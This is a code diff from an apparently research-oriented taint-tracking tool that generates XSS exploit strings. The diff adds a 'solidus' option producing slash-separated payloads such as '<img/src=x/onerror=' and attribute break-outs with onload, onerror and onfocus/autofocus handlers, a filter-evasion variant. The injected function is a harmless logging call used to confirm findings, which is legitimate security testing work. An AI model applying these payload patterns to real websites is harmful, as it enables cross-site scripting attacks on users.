@@ -611,10 +611,10 @@ bool Metadata::has_correct_exploit_match() const {
 std::string Metadata::default_payload = "taintfoxLog(`xss`)";
 
 std::string Metadata::generate_exploit_from_scratch() const {
-    return generate_exploit_from_scratch(default_payload);
+    return generate_exploit_from_scratch(default_payload, false);
 }
 
-std::string Metadata::generate_exploit_from_scratch(const std::string &function) const {
+std::string Metadata::generate_exploit_from_scratch(const std::string &function, bool solidus) const {
         // // Try to generate an attribute payload on the fly:
         // // Exploit.success: false
         // // Exploit.status: failure
@@ -640,7 +640,11 @@ std::string Metadata::generate_exploit_from_scratch(const std::string &function)
                 if ((get_sink() == "innerHTML") ||
                     (get_sink() == "outerHTML") ||
                     (get_sink() == "insertAdjacentHTML")) {
-                    payload += "<img src=x onerror=";
+                    if (solidus) {
+                        payload += "<img/src=x/onerror=";
+                    } else {
+                        payload += "<img src=x onerror=";
+                    }
                 } else {
                     payload += "<script>";
                 }
@@ -681,10 +685,10 @@ std::string Metadata::generate_exploit_from_scratch(const std::string &function)
 }
 
 std::string Metadata::generate_attribute_exploit_from_scratch() const {
-    return generate_attribute_exploit_from_scratch(default_payload);
+    return generate_attribute_exploit_from_scratch(default_payload, false);
 }
 
-std::string Metadata::generate_attribute_exploit_from_scratch(const std::string& function) const {
+std::string Metadata::generate_attribute_exploit_from_scratch(const std::string& function, bool solidus) const {
     std::string payload = "";
     if (is_initialized() && has_valid_exploit() &&
         (get_exploit_type() == Exploit_Type::Html) &&
@@ -700,19 +704,25 @@ std::string Metadata::generate_attribute_exploit_from_scratch(const std::string&
             // Need to break out of attribute
             payload += get_exploit_quote_type();
             // insert event handlers
-            payload += " onload=" + function;
-            payload += " onerror=" + function;
-            // Create new attribute
-            payload += " foo=";
+            payload += solidus ? "/" : " ";
+            payload += "onload=" + function;
+            payload += solidus ? "/" : " ";
+            payload += "onerror=" + function;
+            payload += solidus ? "/" : " ";
+            payload += "foo=";
             payload += get_exploit_quote_type();
         } else if (get_exploit_tag() == "input") {
             // Trickery
             // Need to break out of attribute
             payload += get_exploit_quote_type();
             // insert event handlers
-            payload += " onfocus=" + function;
+            payload += solidus ? "/" : " ";
+            payload += "onfocus=" + function;
+            payload += solidus ? "/" : " ";
             // Create new attribute
-            payload += " autofocus foo=";
+            payload += "autofocus";
+            payload += solidus ? "/" : " ";
+            payload += "foo=";
             payload += get_exploit_quote_type();
         } else {
             // These require user interaction, leave them out
@@ -804,7 +814,7 @@ std::string Metadata::generate_exploit_url(const std::string& payload) const
     std::string uuid_without_dashes = std::regex_replace(get_exploit_uuid(), std::regex("-"), "");
 
     if (original_payload == "") {
-        original_payload = generate_exploit_from_scratch("taintfoxLog('" + uuid_without_dashes + "')");
+        original_payload = generate_exploit_from_scratch("taintfoxLog('" + uuid_without_dashes + "')", false);
     } else {
         original_payload = std::regex_replace(original_payload, std::regex("taintfoxLog\\(1\\)"), "taintfoxLog('" + uuid_without_dashes + "')");
     }
